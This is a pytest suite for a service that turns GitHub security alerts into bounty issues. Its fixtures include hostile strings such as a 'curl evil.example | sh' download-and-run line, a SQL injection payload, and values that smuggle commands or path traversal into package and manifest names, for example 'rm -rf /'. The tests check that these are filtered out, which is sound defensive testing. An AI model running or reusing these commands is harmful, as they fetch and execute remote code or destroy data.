"""Security-alert dispatch. In-memory SQLite; GitHub and issue sync are faked."""

# ruff: noqa: E402

from __future__ import annotations

import asyncio
import logging
import sys
import types
import uuid
from datetime import datetime, timedelta, timezone
from decimal import Decimal

sys.modules.setdefault("asyncpg", types.ModuleType("asyncpg"))

import pytest
from sqlalchemy import create_engine, select
from sqlalchemy.orm import Session
from sqlalchemy.pool import StaticPool

from app.config import settings
from app.models.github import (
    AlertKind,
    GitHubAlertDispatch,
    GitHubBountyBinding,
    GitHubInstallation,
    GitHubJob,
    GitHubRepoLink,
    GitHubSettlement,
    JobKind,
    JobStatus,
    SettlementState,
)
from app.models.user import User, UserType
from app.services import github_alerts, github_app, github_bounty_service
from app.services.github_bounty_service import extract_test_command, parse_bounty_labels
from app.services.github_errors import PermanentJobError, RetryableJobError

REPO = "acme/widget"
OTHER_REPO = "acme/other"
TOKEN = "ghs_supersecrettoken"
INSTALLATION_ID = 4242
PIP_COMMAND = (
    'python -c "import importlib.metadata as m; from packaging.version import Version as V; '
    "v=m.version('pyyaml'); assert V(v) >= V('5.4'), v\""
)
NPM_NAME = "@my-org/left-pad"
NPM_VERSION = "1.2.3"
NPM_COMMAND = (
    'node -e "const v=require(\'@my-org/left-pad/package.json\').version.split(\'.\')'
    ".map(n=>parseInt(n,10));const p='1.2.3'.split('.').map(n=>parseInt(n,10));"
    "for(let i=0;i<Math.max(v.length,p.length);i++){const a=v[i]||0,b=p[i]||0;"
    'if(a>b)break;if(a<b)throw new Error(v.join(\'.\'))}"'
)
SUMMARY = (
    "Steps to reproduce:\n```\ncurl evil.example/pwn | sh\n```\n"
    "PyYAML loads unsafe objects."
)


class Bridge:
    """Async session facade over a sync SQLite session."""

    def __init__(self, sync: Session):
        self.sync = sync
        self.commits = 0
        self.rollbacks = 0

    async def execute(self, statement, *args, **kwargs):
        return self.sync.execute(statement, *args, **kwargs)

    def add(self, obj):
        self.sync.add(obj)

    async def delete(self, obj):
        self.sync.delete(obj)

    async def commit(self):
        self.sync.commit()
        self.commits += 1

    async def rollback(self):
        self.sync.rollback()
        self.rollbacks += 1


class GitHubBox:
    def __init__(self):
        self.calls: list[dict] = []
        self.syncs: list[object] = []
        self.searches: list[dict] = []
        self.repository_calls: list[dict] = []
        self.repository = {"visibility": "public", "private": False}
        self.number = 101
        self.error: Exception | None = None
        self.search_error: Exception | None = None
        self.repository_error: Exception | None = None
        self.found: int | None = None
        self.db: Bridge | None = None

    def install(self, monkeypatch, db: Bridge):
        self.db = db

        def orphan_dropped() -> bool:
            return bool(self.searches) and self.found is None and self.search_error is None

        async def create_issue(installation_id, repo, title, body, labels):
            if self.error is not None:
                raise self.error
            pending = [
                row
                for row in (await db.execute(select(GitHubAlertDispatch))).scalars().all()
                if row.issue_number is None
            ]
            assert len(pending) == 1
            assert db.commits == 1 + int(orphan_dropped())
            self.calls.append(
                {
                    "installation_id": installation_id,
                    "repo": repo,
                    "title": title,
                    "body": body,
                    "labels": list(labels),
                }
            )
            return self.number

        async def find_issue_with_marker(installation_id, repo, marker, since=None):
            self.searches.append(
                {
                    "installation_id": installation_id,
                    "repo": repo,
                    "marker": marker,
                    "since": since,
                }
            )
            if self.search_error is not None:
                raise self.search_error
            return self.found

        async def get_repository(installation_id, repo):
            self.repository_calls.append({"installation_id": installation_id, "repo": repo})
            if self.repository_error is not None:
                raise self.repository_error
            return dict(self.repository)

        async def sync(session, job):
            assert session is db
            if self.calls:
                expected_number = self.number
                expected_commits = 2 + int(orphan_dropped())
            else:
                expected_number = self.found
                expected_commits = 1
            opened = [
                row
                for row in (await session.execute(select(GitHubAlertDispatch))).scalars().all()
                if row.issue_number == expected_number
            ]
            assert len(opened) == 1
            assert session.commits == expected_commits
            self.syncs.append(job)

        monkeypatch.setattr(github_app, "create_issue", create_issue)
        monkeypatch.setattr(github_app, "find_issue_with_marker", find_issue_with_marker)
        monkeypatch.setattr(github_app, "get_repository", get_repository)
        monkeypatch.setattr(github_bounty_service, "_sync_issue_terms", sync)
        return self


def _run(coro):
    return asyncio.run(coro)


def make_engine():
    engine = create_engine(
        "sqlite://",
        poolclass=StaticPool,
        connect_args={"check_same_thread": False},
    )
    for model in (
        User,
        GitHubInstallation,
        GitHubRepoLink,
        GitHubAlertDispatch,
        GitHubBountyBinding,
        GitHubSettlement,
        GitHubJob,
    ):
        model.__table__.create(engine)
    return engine


@pytest.fixture()
def engine():
    eng = make_engine()
    try:
        yield eng
    finally:
        eng.dispose()


@pytest.fixture()
def db(engine):
    bridge = Bridge(Session(engine, expire_on_commit=False))
    try:
        yield bridge
    finally:
        bridge.sync.close()


@pytest.fixture()
def configured(monkeypatch):
    monkeypatch.setattr(settings, "GITHUB_AUTO_DISPATCH_ALERTS", True)
    monkeypatch.setattr(settings, "GITHUB_ATE_PER_USD", 100)
    monkeypatch.setattr(settings, "GITHUB_AUTO_BOUNTY_DEPENDABOT_USD", 15)
    monkeypatch.setattr(settings, "GITHUB_AUTO_BOUNTY_CODEQL_USD", 25)
    monkeypatch.setattr(settings, "GITHUB_MAX_WEEKLY_AUTO_BOUNTY_ATE", 10000)


@pytest.fixture()
def github(monkeypatch, db):
    return GitHubBox().install(monkeypatch, db)


def _user() -> User:
    return User(
        id=uuid.uuid4(),
        email="funder@example.com",
        password_hash="hash",
        display_name="Funder",
        user_type=UserType.REQUESTER,
        exchange_bot_id="bot-1",
    )


def _seed(db: Bridge, *, enabled=True, funded=True, auto=True, repo=REPO) -> None:
    user = _user()
    db.sync.add_all(
        [
            user,
            GitHubInstallation(
                id=uuid.uuid4(),
                installation_id=INSTALLATION_ID,
                account_login="acme",
            ),
            GitHubRepoLink(
                id=uuid.uuid4(),
                installation_id=INSTALLATION_ID,
                repo_full_name=repo,
                funder_user_id=user.id if funded else None,
                enabled=enabled,
                default_policy={"allowed_paths": ["src"]},
                required_checks=[],
                auto_dispatch_alerts=auto,
            ),
        ]
    )
    db.sync.commit()


def _job(event: str, data: dict, action: str = "created") -> GitHubJob:
    return GitHubJob(
        kind=JobKind.SECURITY_ALERT.value,
        payload={"event": event, "action": action, "data": data},
    )


def _envelope(alert: dict, *, private: bool | None = False, token: str = TOKEN) -> dict:
    repository: dict = {"full_name": REPO, "name": "widget"}
    if private is not None:
        repository["private"] = private
    return {
        "action": "created",
        "alert": alert,
        "repository": repository,
        "installation": {"id": INSTALLATION_ID, "account": {"login": "acme"}},
        "token": token,
    }


def _dependabot(
    *,
    number: int = 7,
    ecosystem: str = "pip",
    name: str = "PyYAML",
    manifest: str = "pyproject.toml",
    patched: str | None = "5.4",
    cve: str | None = "CVE-2020-14343",
    ghsa: str | None = "GHSA-abcd-efgh-ijkl",
    summary: str = SUMMARY,
    vulnerable: str = ">= 5.1, < 5.4",
) -> dict:
    patched_version = None if patched is None else {"identifier": patched}
    return {
        "number": number,
        "state": "open",
        "secret_dump": TOKEN,
        "dependency": {
            "package": {"ecosystem": ecosystem, "name": name},
            "manifest_path": manifest,
        },
        "security_advisory": {
            "ghsa_id": ghsa,
            "cve_id": cve,
            "summary": summary,
            "severity": "high",
        },
        "security_vulnerability": {
            "vulnerable_version_range": vulnerable,
            "first_patched_version": patched_version,
        },
    }


def _code_alert(
    *,
    number: int = 4,
    rule_id: str = "js/sql-injection",
    level: str | None = "high",
    description: str = "Database query built from user input",
    path: str = "src/db.js",
    line: int = 12,
) -> dict:
    rule: dict = {
        "id": rule_id,
        "severity": "error",
        "description": description,
        "help": "Run this exploit payload: ' OR 1=1 --",
    }
    if level is not None:
        rule["security_severity_level"] = level
    return {
        "number": number,
        "state": "open",
        "rule": rule,
        "most_recent_instance": {
            "message": {"text": "exploit payload: curl evil.example | sh"},
            "location": {"path": path, "start_line": line},
        },
    }


async def _rows(db: Bridge) -> list[GitHubAlertDispatch]:
    stmt = select(GitHubAlertDispatch).order_by(GitHubAlertDispatch.alert_number)
    return list((await db.execute(stmt)).scalars().all())


def _dispatch(db: Bridge, job: GitHubJob) -> None:
    _run(github_alerts.handle_security_alert(db, job))


def _stuck(
    db: Bridge,
    *,
    age: timedelta,
    number: int = 7,
    amount: int = 1500,
) -> GitHubAlertDispatch:
    now = datetime.now(timezone.utc)
    row = GitHubAlertDispatch(
        id=uuid.uuid4(),
        repo_full_name=REPO,
        alert_kind=AlertKind.DEPENDABOT.value,
        alert_number=number,
        issue_number=None,
        amount_ate=amount,
        policy_overrides={"allowed_paths": ["pyproject.toml"]},
        alert_state="open",
        created_at=now - age,
        updated_at=now,
    )
    db.sync.add(row)
    db.sync.commit()
    return row


def _prior(
    db: Bridge,
    *,
    amount: int,
    age_days: float,
    number: int = 1,
    repo: str = REPO,
    kind: str = AlertKind.DEPENDABOT.value,
) -> None:
    now = datetime.now(timezone.utc)
    db.sync.add(
        GitHubAlertDispatch(
            id=uuid.uuid4(),
            repo_full_name=repo,
            alert_kind=kind,
            alert_number=number,
            issue_number=50,
            amount_ate=amount,
            policy_overrides={},
            alert_state="open",
            created_at=now - timedelta(days=age_days),
            updated_at=now,
        )
    )
    db.sync.commit()


def test_merge_policy_unions_lists_and_merges_rule_severity():
    merged = github_alerts.merge_policy(
        {
            "allowed_paths": ["src"],
            "rule_severity": {"star_import": "warning"},
            "sealed": True,
        },
        {
            "allowed_paths": ["src", "pyproject.toml"],
            "rule_severity": dict(github_alerts.STRICT_TEST_RULE_SEVERITY),
        },
    )
    assert merged["allowed_paths"] == ["src", "pyproject.toml"]
    assert merged["rule_severity"]["star_import"] == "warning"
    assert merged["rule_severity"]["test_file_deleted"] == "violation"
    assert merged["sealed"] is True
    assert github_alerts.ALERT_FIXED_TRIGGER == "merged_and_alert_fixed"


def test_flag_off_does_nothing(db, monkeypatch, github):
    monkeypatch.setattr(settings, "GITHUB_AUTO_DISPATCH_ALERTS", False)
    _seed(db)
    _dispatch(db, _job("dependabot_alert", _envelope(_dependabot())))
    assert github.calls == []
    assert github.syncs == []
    assert _run(_rows(db)) == []
    assert db.commits == 0


def test_flag_off_ignores_a_garbage_payload(db, monkeypatch, github):
    monkeypatch.setattr(settings, "GITHUB_AUTO_DISPATCH_ALERTS", False)
    _dispatch(db, GitHubJob(kind=JobKind.SECURITY_ALERT.value, payload={"nope": True}))
    assert github.calls == []


@pytest.mark.parametrize(
    ("enabled", "funded", "auto"),
    [
        (False, True, True),
        (True, False, True),
        (True, True, False),
    ],
)
def test_repo_not_opted_in_does_nothing(db, configured, github, enabled, funded, auto):
    _seed(db, enabled=enabled, funded=funded, auto=auto)
    _dispatch(db, _job("dependabot_alert", _envelope(_dependabot())))
    assert github.calls == []
    assert github.syncs == []
    assert _run(_rows(db)) == []


def test_non_created_action_does_nothing(db, configured, github):
    _seed(db)
    _dispatch(db, _job("dependabot_alert", _envelope(_dependabot()), action="dismissed"))
    assert github.calls == []
    assert _run(_rows(db)) == []


def test_dependabot_pip_opens_bounty(db, configured, github, caplog):
    caplog.set_level(logging.INFO, logger="app.services.github_alerts")
    _seed(db)
    data = _envelope(_dependabot())
    _dispatch(db, _job("dependabot_alert", data))

    assert len(github.calls) == 1
    call = github.calls[0]
    assert call["installation_id"] == INSTALLATION_ID
    assert call["repo"] == REPO
    assert call["labels"] == ["bounty: $15"]
    assert "tier: security" not in call["labels"]
    assert call["title"] == "Security: update PyYAML to 5.4 (CVE-2020-14343)"
    assert call["body"].count("```") == 2
    assert "<!-- settlebridge:alert:dependabot:7 -->" in call["body"]
    assert "Vulnerable range: >= 5.1, < 5.4" in call["body"]
    assert "Patched version: 5.4" in call["body"]
    advisory = "Advisory: CVE-2020-14343 (https://github.com/advisories/GHSA-abcd-efgh-ijkl)"
    assert advisory in call["body"]
    assert "manifest and lockfile" in call["body"]
    assert extract_test_command(call["body"]) == PIP_COMMAND
    assert "PyYAML" not in PIP_COMMAND
    assert "curl evil.example" not in extract_test_command(call["body"])
    parsed = parse_bounty_labels(call["labels"])
    assert parsed.amount_usd == Decimal("15")
    assert parsed.security is False

    row = _run(_rows(db))[0]
    assert row.alert_kind == AlertKind.DEPENDABOT.value
    assert row.alert_number == 7
    assert row.issue_number == 101
    assert row.amount_ate == 1500
    assert row.alert_state == "open"
    assert row.policy_overrides == {
        "allowed_paths": ["pyproject.toml", "poetry.lock", "uv.lock"],
        "allowed_dependency_changes": ["pyyaml"],
        "rule_severity": dict(github_alerts.STRICT_TEST_RULE_SEVERITY),
    }
    found = _run(github_alerts.dispatch_for_issue(db, REPO, 101))
    assert found is not None and found.id == row.id
    assert _run(github_alerts.dispatch_for_issue(db, REPO, 999)) is None
    assert db.commits == 2

    assert len(github.syncs) == 1
    event, action, payload = github_bounty_service._webhook_parts(github.syncs[0])
    assert (event, action) == ("issues", "labeled")
    assert github_bounty_service._repository_full_name(payload) == REPO
    assert github_bounty_service._installation_id(payload) == INSTALLATION_ID
    issue = payload["issue"]
    assert issue["number"] == 101
    assert issue["state"] == "open"
    assert issue["title"] == call["title"]
    assert issue["body"] == call["body"]
    assert github_bounty_service._label_names(issue) == ["bounty: $15"]
    assert payload["repository"] is not data["repository"]
    assert payload["repository"]["full_name"] == REPO
    assert payload["installation"]["id"] == INSTALLATION_ID
    assert TOKEN not in call["body"]
    assert TOKEN not in call["title"]
    assert TOKEN not in caplog.text
    blob = str(github.syncs[0].payload)
    assert TOKEN not in blob

    _dispatch(db, _job("dependabot_alert", data))
    assert len(github.calls) == 1
    assert len(github.syncs) == 1
    assert len(_run(_rows(db))) == 1


def test_pip_name_is_pep503_normalized(db, configured, github):
    _seed(db)
    alert = _dependabot(name="Foo_Bar.Baz", patched="1.2.0", manifest="pyproject.toml")
    _dispatch(db, _job("dependabot_alert", _envelope(alert)))
    call = github.calls[0]
    command = extract_test_command(call["body"])
    assert command is not None
    assert "v=m.version('foo-bar-baz')" in command
    assert "V('1.2.0')" in command
    row = _run(_rows(db))[0]
    assert row.policy_overrides["allowed_dependency_changes"] == ["foo-bar-baz"]


def test_npm_scoped_package(db, configured, github):
    _seed(db)
    alert = _dependabot(
        number=8,
        ecosystem="npm",
        name=NPM_NAME,
        manifest="frontend/package.json",
        patched=NPM_VERSION,
        cve=None,
        summary="Prototype pollution in a nested dependency.",
        vulnerable="< 1.2.3",
    )
    _dispatch(db, _job("dependabot_alert", _envelope(alert)))
    call = github.calls[0]
    assert call["labels"] == ["bounty: $15"]
    assert "tier: security" not in call["labels"]
    assert call["title"] == "Security: update @my-org/left-pad to 1.2.3 (GHSA-abcd-efgh-ijkl)"
    assert extract_test_command(call["body"]) == NPM_COMMAND
    assert "<!-- settlebridge:alert:dependabot:8 -->" in call["body"]
    row = _run(_rows(db))[0]
    assert row.policy_overrides["allowed_paths"] == [
        "frontend/package.json",
        "frontend/package-lock.json",
        "frontend/yarn.lock",
        "frontend/pnpm-lock.yaml",
    ]
    assert row.policy_overrides["allowed_dependency_changes"] == [NPM_NAME]
    event, action, payload = github_bounty_service._webhook_parts(github.syncs[0])
    assert event == "issues" and action == "labeled"
    names = github_bounty_service._label_names(payload["issue"])
    assert parse_bounty_labels(names).amount_usd == Decimal("15")


@pytest.mark.parametrize(
    ("manifest", "ecosystem", "expected"),
    [
        ("pyproject.toml", "pip", ["pyproject.toml", "poetry.lock", "uv.lock"]),
        (
            "api/pyproject.toml",
            "pip",
            ["api/pyproject.toml", "api/poetry.lock", "api/uv.lock"],
        ),
        ("requirements.txt", "pip", ["requirements.txt"]),
        ("backend/requirements-dev.txt", "pip", ["backend/requirements-dev.txt"]),
        ("api/poetry.lock", "pip", ["api/poetry.lock", "api/pyproject.toml"]),
        ("uv.lock", "pip", ["uv.lock", "pyproject.toml"]),
        (
            "frontend/package.json",
            "npm",
            [
                "frontend/package.json",
                "frontend/package-lock.json",
                "frontend/yarn.lock",
                "frontend/pnpm-lock.yaml",
            ],
        ),
        ("package-lock.json", "npm", ["package-lock.json", "package.json"]),
        ("yarn.lock", "npm", ["yarn.lock", "package.json"]),
        ("apps/pnpm-lock.yaml", "npm", ["apps/pnpm-lock.yaml", "apps/package.json"]),
    ],
)
def test_lockfile_paths(db, configured, github, manifest, ecosystem, expected):
    _seed(db)
    name = "PyYAML" if ecosystem == "pip" else "left-pad"
    patched = "5.4" if ecosystem == "pip" else "1.0.0"
    alert = _dependabot(ecosystem=ecosystem, name=name, manifest=manifest, patched=patched)
    _dispatch(db, _job("dependabot_alert", _envelope(alert)))
    row = _run(_rows(db))[0]
    assert row.policy_overrides["allowed_paths"] == expected


@pytest.mark.parametrize(
    "alert",
    [
        _dependabot(ecosystem="maven"),
        _dependabot(ecosystem="PIP"),
        _dependabot(patched=None),
        _dependabot(name="PyYAML'; import os"),
        _dependabot(name="foo\nbar"),
        _dependabot(name="../pyyaml"),
        _dependabot(patched="5.4'; import os"),
        _dependabot(patched="5.4\n6"),
        _dependabot(manifest="../../etc/passwd"),
        _dependabot(manifest="pyproject.toml; rm -rf /"),
        _dependabot(ecosystem="npm", name="@My-Org/Pkg", patched="1.2.3"),
        _dependabot(ecosystem="npm", name="@scope/pkg';require('child_process')", patched="1.2.3"),
        _dependabot(ecosystem="npm", name="left-pad", patched="1.2.3;process.exit(1)"),
    ],
)
def test_dependabot_skips_unsafe_or_unsupported(db, configured, github, caplog, alert):
    caplog.set_level(logging.INFO, logger="app.services.github_alerts")
    _seed(db)
    _dispatch(db, _job("dependabot_alert", _envelope(alert)))
    assert github.calls == []
    assert github.syncs == []
    assert _run(_rows(db)) == []
    assert TOKEN not in caplog.text
    assert "curl evil.example" not in caplog.text


def test_missing_patched_object_is_skipped(db, configured, github):
    _seed(db)
    alert = _dependabot()
    alert["security_vulnerability"]["first_patched_version"] = None
    _dispatch(db, _job("dependabot_alert", _envelope(alert)))
    assert github.calls == []
    assert _run(_rows(db)) == []


def test_malformed_alert_is_permanent(db, configured, github):
    _seed(db)
    with pytest.raises(PermanentJobError):
        _dispatch(db, _job("dependabot_alert", _envelope({})))
    assert github.calls == []


@pytest.mark.parametrize(
    ("private", "level", "opened", "security"),
    [
        (False, "high", False, False),
        (None, "critical", False, False),
        (True, "high", False, False),
        (True, None, False, False),
        (False, None, True, False),
        (False, "", True, False),
    ],
)
def test_code_scanning_visibility(db, configured, github, private, level, opened, security):
    _seed(db)
    if private is True:
        github.repository = {"visibility": "private", "private": True}
    alert = _code_alert(level=level)
    _dispatch(db, _job("code_scanning_alert", _envelope(alert, private=private)))
    if not opened:
        assert github.calls == []
        assert _run(_rows(db)) == []
        return
    call = github.calls[0]
    labels = ["bounty: $25"]
    if security:
        labels.append("tier: security")
    assert call["labels"] == labels
    parsed = parse_bounty_labels(call["labels"])
    assert parsed.amount_usd == Decimal("25")
    assert parsed.security is security
    assert "js/sql-injection" in call["title"]
    assert "Database query built from user input" in call["body"]
    assert "Location: src/db.js:12" in call["body"]
    assert "<!-- settlebridge:alert:code_scanning:4 -->" in call["body"]
    assert extract_test_command(call["body"]) is None
    assert "exploit payload" not in call["body"]
    assert "OR 1=1" not in call["body"]
    assert "tier: security" not in call["body"]
    row = _run(_rows(db))[0]
    assert row.alert_kind == AlertKind.CODE_SCANNING.value
    assert row.amount_ate == 2500
    assert row.policy_overrides == {
        "rule_severity": dict(github_alerts.STRICT_TEST_RULE_SEVERITY)
    }
    event, action, payload = github_bounty_service._webhook_parts(github.syncs[0])
    assert (event, action) == ("issues", "labeled")
    assert github_bounty_service._positive_int(payload["issue"]["number"], "issue.number") == 101


def test_weekly_budget_blocks_when_the_sum_would_exceed(
    db, configured, github, monkeypatch, caplog
):
    caplog.set_level(logging.INFO, logger="app.services.github_alerts")
    monkeypatch.setattr(settings, "GITHUB_MAX_WEEKLY_AUTO_BOUNTY_ATE", 3000)
    _seed(db)
    _prior(db, amount=1501, age_days=1, number=1)
    _dispatch(db, _job("dependabot_alert", _envelope(_dependabot(number=9))))
    assert github.calls == []
    assert len(_run(_rows(db))) == 1
    assert "weekly auto-bounty budget" in caplog.text
    assert TOKEN not in caplog.text


def test_weekly_budget_allows_an_exact_fit_and_ignores_old_and_other_repos(
    db, configured, github, monkeypatch
):
    monkeypatch.setattr(settings, "GITHUB_MAX_WEEKLY_AUTO_BOUNTY_ATE", 3000)
    _seed(db)
    _prior(db, amount=1500, age_days=1, number=1)
    _prior(db, amount=9000, age_days=8, number=2)
    _prior(db, amount=9000, age_days=0, number=3, repo=OTHER_REPO)
    _dispatch(db, _job("dependabot_alert", _envelope(_dependabot(number=9))))
    assert len(github.calls) == 1
    rows = _run(_rows(db))
    opened = [row for row in rows if row.alert_number == 9 and row.repo_full_name == REPO]
    assert len(opened) == 1
    assert opened[0].issue_number == 101
    assert opened[0].amount_ate == 1500


def test_stuck_dispatch_does_not_open_another_issue(db, configured, github, caplog):
    caplog.set_level(logging.INFO, logger="app.services.github_alerts")
    _seed(db)
    github.found = 77
    _stuck(db, age=timedelta(0))
    _dispatch(db, _job("dependabot_alert", _envelope(_dependabot())))
    assert github.calls == []
    assert github.searches == []
    assert github.syncs == []
    assert _run(_rows(db))[0].issue_number is None
    assert "not opening another" in caplog.text


def test_old_stuck_dispatch_adopts_the_issue_with_its_marker(db, configured, github, caplog):
    caplog.set_level(logging.INFO, logger="app.services.github_alerts")
    _seed(db)
    row = _stuck(db, age=github_alerts._DISPATCH_GRACE + timedelta(minutes=1))
    github.found = 77
    data = _envelope(_dependabot())
    _dispatch(db, _job("dependabot_alert", data))
    assert github.calls == []
    assert len(github.searches) == 1
    search = github.searches[0]
    assert search["installation_id"] == INSTALLATION_ID
    assert search["repo"] == REPO
    assert search["marker"] == "<!-- settlebridge:alert:dependabot:7 -->"
    created = github_alerts._as_utc(row.created_at)
    assert search["since"] == created - github_alerts._MARKER_SINCE_SKEW
    assert created - search["since"] >= timedelta(minutes=1)
    kept = _run(_rows(db))
    assert len(kept) == 1
    assert kept[0].id == row.id
    assert kept[0].issue_number == 77
    assert kept[0].amount_ate == 1500
    assert db.commits == 1
    assert len(github.syncs) == 1
    event, action, payload = github_bounty_service._webhook_parts(github.syncs[0])
    assert (event, action) == ("issues", "labeled")
    assert payload["issue"]["number"] == 77
    assert "<!-- settlebridge:alert:dependabot:7 -->" in payload["issue"]["body"]
    assert "recovered issue #77" in caplog.text
    assert "not opening another" not in caplog.text
    assert TOKEN not in caplog.text


def test_old_stuck_dispatch_without_a_marker_opens_once(db, configured, github, monkeypatch):
    monkeypatch.setattr(settings, "GITHUB_MAX_WEEKLY_AUTO_BOUNTY_ATE", 1500)
    _seed(db)
    row = _stuck(db, age=github_alerts._DISPATCH_GRACE + timedelta(minutes=1))
    _dispatch(db, _job("dependabot_alert", _envelope(_dependabot())))
    assert len(github.searches) == 1
    assert len(github.calls) == 1
    assert github.calls[0]["repo"] == REPO
    marker = "<!-- settlebridge:alert:dependabot:7 -->"
    assert marker in github.calls[0]["body"]
    rows = _run(_rows(db))
    assert len(rows) == 1
    assert rows[0].id != row.id
    assert rows[0].issue_number == github.number
    assert rows[0].amount_ate == 1500
    assert len(github.syncs) == 1
    issue = github_bounty_service._webhook_parts(github.syncs[0])[2]["issue"]
    assert issue["number"] == github.number
    assert db.commits == 3


def test_orphaned_dispatch_still_respects_the_weekly_budget(
    db, configured, github, monkeypatch, caplog
):
    caplog.set_level(logging.INFO, logger="app.services.github_alerts")
    monkeypatch.setattr(settings, "GITHUB_MAX_WEEKLY_AUTO_BOUNTY_ATE", 1500)
    _seed(db)
    _prior(db, amount=1500, age_days=1, number=1)
    stuck = _stuck(db, age=github_alerts._DISPATCH_GRACE + timedelta(minutes=1))
    _dispatch(db, _job("dependabot_alert", _envelope(_dependabot())))
    assert github.calls == []
    assert github.syncs == []
    assert len(github.searches) == 1
    rows = _run(_rows(db))
    assert [row.alert_number for row in rows] == [1]
    assert rows[0].issue_number == 50
    assert stuck.id not in {row.id for row in rows}
    assert "weekly auto-bounty budget" in caplog.text


def test_stuck_dispatch_search_failure_keeps_the_row(db, configured, github):
    _seed(db)
    row = _stuck(db, age=github_alerts._DISPATCH_GRACE + timedelta(minutes=1))
    github.search_error = github_app.GitHubAPIError("unavailable", 503)
    with pytest.raises(RetryableJobError):
        _dispatch(db, _job("dependabot_alert", _envelope(_dependabot())))
    assert github.calls == []
    assert github.syncs == []
    assert len(github.searches) == 1
    kept = _run(_rows(db))
    assert len(kept) == 1
    assert kept[0].id == row.id
    assert kept[0].issue_number is None
    assert kept[0].amount_ate == 1500
    assert db.commits == 0
    github.search_error = None
    github.found = 77
    _dispatch(db, _job("dependabot_alert", _envelope(_dependabot())))
    assert github.calls == []
    assert _run(_rows(db))[0].issue_number == 77


def test_github_outage_reserves_the_row_and_a_retry_does_not_open_a_second_issue(
    db, configured, github
):
    _seed(db)
    github.error = github_app.GitHubAPIError("unavailable", 503)
    with pytest.raises(RetryableJobError):
        _dispatch(db, _job("dependabot_alert", _envelope(_dependabot())))
    assert github.calls == []
    row = _run(_rows(db))[0]
    assert row.issue_number is None
    assert db.commits == 1
    github.error = None
    _dispatch(db, _job("dependabot_alert", _envelope(_dependabot())))
    assert github.calls == []
    assert github.searches == []
    assert _run(_rows(db))[0].issue_number is None


def test_github_client_error_is_permanent_and_frees_the_row(db, configured, github):
    _seed(db)
    github.error = github_app.GitHubAPIError("forbidden", 403)
    with pytest.raises(PermanentJobError):
        _dispatch(db, _job("dependabot_alert", _envelope(_dependabot())))
    assert _run(_rows(db)) == []
    github.error = None
    db.commits = 0
    _dispatch(db, _job("dependabot_alert", _envelope(_dependabot())))
    assert len(github.calls) == 1
    assert _run(_rows(db))[0].issue_number == github.number


def _waiting(
    db: Bridge,
    *,
    issue_number: int = 50,
    state: str = SettlementState.ESCROW_CREATED.value,
    due_in: timedelta = timedelta(minutes=12),
) -> tuple[GitHubSettlement, GitHubJob]:
    binding = GitHubBountyBinding(
        id=uuid.uuid4(), bounty_id=uuid.uuid4(), repo_full_name=REPO, issue_number=issue_number
    )
    settlement = GitHubSettlement(
        id=uuid.uuid4(),
        binding_id=binding.id,
        spec_id=uuid.uuid4(),
        head_sha="a" * 40,
        state=state,
        idempotency_prefix=f"gh-settle:{binding.id}",
    )
    job = GitHubJob(
        id=uuid.uuid4(),
        kind=JobKind.ADVANCE_SETTLEMENT.value,
        payload={"settlement_id": str(settlement.id)},
        status=JobStatus.PENDING.value,
        next_run_at=datetime.now(timezone.utc) + due_in,
    )
    db.sync.add_all([binding, settlement, job])
    db.sync.commit()
    return settlement, job


def _fixed(number: int = 1) -> GitHubJob:
    alert = _dependabot(number=number)
    alert["state"] = "fixed"
    return _job("dependabot_alert", _envelope(alert), action="fixed")


def _due(db: Bridge, job: GitHubJob) -> datetime:
    db.sync.expire_all()
    return github_alerts._as_utc(db.sync.get(GitHubJob, job.id).next_run_at)


@pytest.mark.parametrize("dispatch_on", [True, False])
def test_fixed_alert_wakes_only_its_waiting_settlement(db, monkeypatch, github, dispatch_on):
    monkeypatch.setattr(settings, "GITHUB_AUTO_DISPATCH_ALERTS", dispatch_on)
    _prior(db, amount=1500, age_days=0, number=1)
    _, mine = _waiting(db, issue_number=50)
    _, other = _waiting(db, issue_number=51)
    before = datetime.now(timezone.utc)
    _dispatch(db, _fixed(1))
    assert _due(db, mine) <= datetime.now(timezone.utc)
    assert _due(db, mine) >= before - timedelta(seconds=1)
    assert _due(db, other) > datetime.now(timezone.utc) + timedelta(minutes=10)
    assert github.calls == []
    assert db.commits == 1


@pytest.mark.parametrize(
    "state",
    [
        SettlementState.PENDING.value,
        SettlementState.DELIVERED.value,
        SettlementState.RELEASED.value,
        SettlementState.FAILED.value,
    ],
)
def test_fixed_alert_leaves_other_settlement_states_alone(db, configured, github, state):
    _prior(db, amount=1500, age_days=0, number=1)
    _, job = _waiting(db, state=state)
    _dispatch(db, _fixed(1))
    assert _due(db, job) > datetime.now(timezone.utc) + timedelta(minutes=10)
    assert db.commits == 0


def test_fixed_alert_without_a_dispatch_does_nothing(db, configured, github):
    _prior(db, amount=1500, age_days=0, number=1)
    _, job = _waiting(db)
    _dispatch(db, _fixed(2))
    assert _due(db, job) > datetime.now(timezone.utc) + timedelta(minutes=10)
    assert db.commits == 0


def test_fixed_alert_does_not_touch_a_job_that_is_already_due(db, configured, github):
    _prior(db, amount=1500, age_days=0, number=1)
    _, job = _waiting(db, due_in=timedelta(minutes=-3))
    _dispatch(db, _fixed(1))
    assert _due(db, job) < datetime.now(timezone.utc) - timedelta(minutes=2)
    assert db.commits == 0


def test_fixed_alert_with_a_bad_repo_is_permanent(db, configured, github):
    job = _fixed(1)
    job.payload["data"]["repository"]["full_name"] = "not a repo"
    with pytest.raises(PermanentJobError):
        _dispatch(db, job)


def _link_visibility(db: Bridge) -> str | None:
    return db.sync.execute(select(GitHubRepoLink)).scalar_one().visibility


def test_private_dependabot_opens_no_issue(db, configured, github, caplog):
    caplog.set_level(logging.INFO, logger="app.services.github_alerts")
    _seed(db)
    github.repository = {"visibility": "private", "private": True, "token": TOKEN}
    _dispatch(db, _job("dependabot_alert", _envelope(_dependabot(), private=True)))
    assert github.calls == []
    assert github.syncs == []
    assert _run(_rows(db)) == []
    assert github.repository_calls == [{"installation_id": INSTALLATION_ID, "repo": REPO}]
    assert _link_visibility(db) == "private"
    assert TOKEN not in caplog.text


def test_internal_code_scanning_opens_no_issue(db, configured, github):
    _seed(db)
    github.repository = {"visibility": "internal", "private": True}
    data = _envelope(_code_alert(level=None), private=True)
    data["repository"]["visibility"] = "internal"
    _dispatch(db, _job("code_scanning_alert", data))
    assert github.calls == []
    assert github.syncs == []
    assert _run(_rows(db)) == []
    assert _link_visibility(db) == "internal"


def test_unknown_visibility_refreshes_then_opens_a_public_dependabot(db, configured, github):
    _seed(db)
    _dispatch(db, _job("dependabot_alert", _envelope(_dependabot(), private=None)))
    assert len(github.calls) == 1
    assert github.repository_calls == [{"installation_id": INSTALLATION_ID, "repo": REPO}]
